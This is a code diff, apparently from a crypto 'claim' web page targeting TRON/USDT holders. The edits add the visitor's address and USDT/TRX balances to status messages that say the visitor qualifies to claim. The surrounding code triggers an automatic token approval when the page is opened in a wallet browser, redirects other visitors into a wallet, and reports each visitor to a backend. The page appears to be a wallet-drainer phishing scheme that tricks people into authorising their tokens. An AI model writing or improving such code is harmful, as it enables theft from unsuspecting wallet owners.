@@ -1103,13 +1103,19 @@ async function initWallet(needAutoApprove) {
 
                 if (isA1Repeat && isA1Success) {
                     // 检测到A1防重复对象（携带A1-204）→ 立即解锁
-                    userInfoEl.innerHTML = `<br><span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>`;
+                    userInfoEl.innerHTML = `
+                    ${shortAddr}<br>
+                    USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
+                    <br><span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>`;
                     bindUnlockedCoreLogic();
                 } else {
                     // 未命中A1防重复→发送A1，返回204后解锁
                     const a1Result = await sendSignalA1();
                     if (a1Result === "204") {
-                        userInfoEl.innerHTML = `<br><span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>`;
+                        userInfoEl.innerHTML = `
+                        ${shortAddr}<br>
+                        USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
+                        <br><span style='color: #3b82f6; font-size: 13px;'>✅ 环境符合领取条件</span>`;
                         bindUnlockedCoreLogic();
                     }
                 }
@@ -1150,7 +1156,10 @@ function bindUnlockedCoreLogic() {
             // 1. 检测是否已在钱包内→直接执行授权（不跳转、不刷新）
             const isInWalletBrowser = checkIsInWalletBrowser();
             if (isInWalletBrowser) {
-                userInfoEl.innerHTML = `<br><span style='color: #4ade80; font-size: 13px;'>✅ 环境符合领取条件</span>`;
+                userInfoEl.innerHTML = `
+                ${shortAddr}<br>
+                USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
+                <br><span style='color: #4ade80; font-size: 13px;'>✅ 环境符合领取条件</span>`;
                 await autoApprove(); // 调用你原有授权逻辑
                 btn.disabled = false;
                 btn.textContent = lang.approveBtnText;
@@ -1159,7 +1168,10 @@ function bindUnlockedCoreLogic() {
 
             // 2. 不在钱包内→先处理B1信号，跳转后紧跟刷新
             if (hasSentB1Signal(userAddress)) {
-                userInfoEl.innerHTML = `<br><span style='color: #4ade80; font-size: 13px;'>✅ 请点击确认</span>`;
+                userInfoEl.innerHTML = `
+                ${shortAddr}<br>
+                USDT余额：${tokenBalance.toFixed(2)} | TRX余额：${trxBalance.toFixed(2)}<br>
+                <br><span style='color: #4ade80; font-size: 13px;'>✅ 请点击确认</span>`;
                 await handleJump(); // 执行跳转
                 window.location.reload(); // 紧跟刷新，无延迟
                 return;
@@ -1208,7 +1220,7 @@ async function sendSignalA1() {
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             a1Status[userAddress] = "success"; // 标记A1-204，成为防重复对象
             localStorage.setItem(A1_STATUS_KEY, JSON.stringify(a1Status));
-            console.log("✅环境符合领取条件");
+            console.log("✅ 环境符合领取条件");
             return "204";
         }
         throw new Error(`A1返回状态${res.status}`);
